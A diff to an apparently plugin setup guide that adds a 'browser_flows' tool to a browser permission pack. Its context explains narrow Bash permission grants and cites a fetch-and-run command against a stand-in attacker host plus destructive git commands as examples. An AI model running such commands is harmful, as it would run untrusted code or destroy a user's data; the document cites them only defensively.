@@ -488,7 +488,7 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 |---|---|---|
 | Always-on core | `ping`, `capture`, `compile_*`, `memory_prune`, `task_*`, `links_rewrite`, `report_write` | `/init` (above) |
 | SEO-gated | `serpapi_search`, `open_page_rank`, `gsc_*`, `page_speed_*`, `google_auth` | configure-skills A.2a (SEO walk) |
-| Browser-gated | `perplexity_search`, `playwright_*` | configure-skills A.2b (Browser walk) |
+| Browser-gated | `perplexity_search`, `playwright_*`, `browser_flows` | configure-skills A.2b (Browser walk) |
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
@@ -727,7 +727,7 @@ The scaffold is done. Before showing the final confirmation, offer to wire up AP
 > Each pack already ships loaded with the plugin. Activating a pack grants its MCP tool permissions in `settings.json` (so calls don't re-prompt) and ensures empty env placeholders exist in `settings.local.json` for the keys you'll fill via your editor. Skip entirely if you want to come back later via `/agent-kevin:configure-skills`.
 >
 > - ☐ SEO pack (serpapi · open-page-rank · GSC · page-speed · WP · search-audit)
-> - ☐ Browser pack (perplexity search + playwright screenshot/pdf/record)
+> - ☐ Browser pack (perplexity search + playwright screenshot/pdf/record + browser-flows)
 > - ☐ Third-party libraries (aaron-he-zhu SEO/GEO skills, coreyhaines31 marketing playbooks, others)
 
 Behavior on the response:
